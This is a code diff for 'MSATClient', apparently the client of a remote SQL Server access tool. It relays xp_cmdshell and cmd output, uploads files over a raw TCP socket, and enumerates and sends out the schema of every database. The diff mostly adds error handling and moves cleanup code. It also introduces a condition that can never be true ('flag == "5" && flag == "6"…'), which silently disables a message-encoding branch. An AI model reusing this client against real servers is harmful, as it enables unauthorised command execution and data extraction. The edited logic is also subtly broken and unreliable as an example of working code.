@@ -220,7 +220,7 @@ namespace MSATClient
                             FileStream fsRead = new FileStream(mess, FileMode.Open);
                             long fileLength = fsRead.Length;
                             SendMess(tcpSocket, Path.GetFileName(mess) + "," + fileLength.ToString(), "5");
-                            byte[] Filebuffer = new byte[1024 * 1024 * 3];//定义5MB的缓存空间（1024字节(b)=1千字节(kb)）
+                            byte[] Filebuffer = new byte[1024 * 1024 * 3];//定义3MB的缓存空间（1024字节(b)=1千字节(kb)）
                             int readLength = 1024 * 1024 * 3;  //定义读取的长度
                             long sentFileLength = 0;//定义已发送的长度
                             while (readLength > 0 && sentFileLength < fileLength)
@@ -232,16 +232,16 @@ namespace MSATClient
                                 sentFileLength += readLength;//计算已读取文件大小
                                 fsRead.Read(Filebuffer, 0, readLength);
                                 tcpSocket.Send(Filebuffer, 0, readLength, SocketFlags.None);//继续发送剩下的数据包
-                                fsRead = null;
-                                mess = null;
-                                Filebuffer = null;
-                                GC.Collect();
                             }
                             fsRead.Close();//关闭文件流
+                            fsRead = null;
+                            mess = null;
+                            Filebuffer = null;
+                            GC.Collect();
                         }
                         catch (Exception ex)
                         {
-                            SendMess(tcpSocket, ex.Message + "\r\n", "6");
+                            SendMess(tcpSocket, ex.Message + filePath + "\r\n", "6");
                         }
                     }
                     else if (firstFlag == '6') //服务端->客户端 传输文件
@@ -386,10 +386,12 @@ namespace MSATClient
             try
             {
                 //返回的数据库信息，sql查询结果，xp_cmdshell执行结果，cmd执行结果不加密
-                if (flag != "1" && flag != "2" && flag != "3" && flag != "4")
-                    mess = Scale.StringToUnicode(mess);
+                //if (flag != "1" && flag != "2" && flag != "3" && flag != "4")
+                if (flag == "5" && flag == "6" && flag == "a" && flag == "b")
+                        mess = "$GabgM" + Scale.StringToUnicode(mess);
                 //因为cmd执行结果是按行读取，实时返回传输，会导致粘包问题，所以加上标识符，便于服务端识别
-                else if (flag == "4")
+                //else if (flag == "4")
+                else
                     mess = "$GabgM" + mess;
                 byte[] sendmess = Encoding.UTF8.GetBytes(mess);
                 mess = flag + getLength(mess.Length) + mess;
@@ -469,26 +471,34 @@ namespace MSATClient
                     SendMess(tcpClient, mess, "1");
                     SendMess(tcpClient, "3" + dataSet.Tables[0].Rows[0]["Column1"].ToString(), "1");
                     //查询数据库所有表名，字段名
-                    SqlDataAdapter dbreader = new SqlDataAdapter("SELECT Name from Master..SysDatabases ORDER BY Name", sql);
-                    DataSet dbDataSet = new DataSet();
-                    dbreader.Fill(dbDataSet);
-                    DataSet dataSet1 = new DataSet();
-                    SqlDataAdapter tablesReader;
-                    String sqlTableInfo = "";
-                    foreach (DataRow row in dbDataSet.Tables[0].Rows)
+                    try
                     {
-                        sqlTableInfo += "SELECT '" + row[0].ToString() + "' as database_name,table_name,column_name FROM " + row[0].ToString() + ".[INFORMATION_SCHEMA].[COLUMNS] order by TABLE_NAME;";
+                        SqlDataAdapter dbreader = new SqlDataAdapter("SELECT Name from Master..SysDatabases ORDER BY Name", sql);
+                        DataSet dbDataSet = new DataSet();
+                        dbreader.Fill(dbDataSet);
+                        DataSet dataSet1 = new DataSet();
+                        SqlDataAdapter tablesReader;
+                        String sqlTableInfo = "";
+                        foreach (DataRow row in dbDataSet.Tables[0].Rows)
+                        {
+                            sqlTableInfo += "SELECT '" + row[0].ToString() + "' as database_name,table_name,column_name FROM " + row[0].ToString() + ".[INFORMATION_SCHEMA].[COLUMNS] order by TABLE_NAME;";
+                        }
+                        tablesReader = new SqlDataAdapter(sqlTableInfo, sql);
+                        tablesReader.Fill(dataSet1);
+                        mess = dataSet1.GetXml();
+                        SendMess(tcpClient, "4" + mess, "1");
+
+                        dbreader = null;
+                        dbDataSet = null;
+                        dataSet1 = null;
+                        tablesReader = null;
                     }
-                    tablesReader = new SqlDataAdapter(sqlTableInfo, sql);
-                    tablesReader.Fill(dataSet1);
-                    mess = dataSet1.GetXml();
-                    SendMess(tcpClient, "4" + mess, "1");
+                    catch (Exception ex)
+                    {
+                        SendMess(tcpClient, "4数据库结构获取失败！", "1");
+                    }
                     reader = null;
                     dataSet = null;
-                    dbreader = null;
-                    dbDataSet = null;
-                    dataSet1 = null;
-                    tablesReader = null;
                     GC.Collect();
                 }
             }
@@ -507,7 +517,7 @@ namespace MSATClient
         public static String getLength(int stringlength)
         {
             String strLength = "";
-            stringlength += 11;
+            stringlength += 12;
             strLength = Convert.ToString(stringlength);
             for (int i = strLength.Length; i < 11; i++)
             {
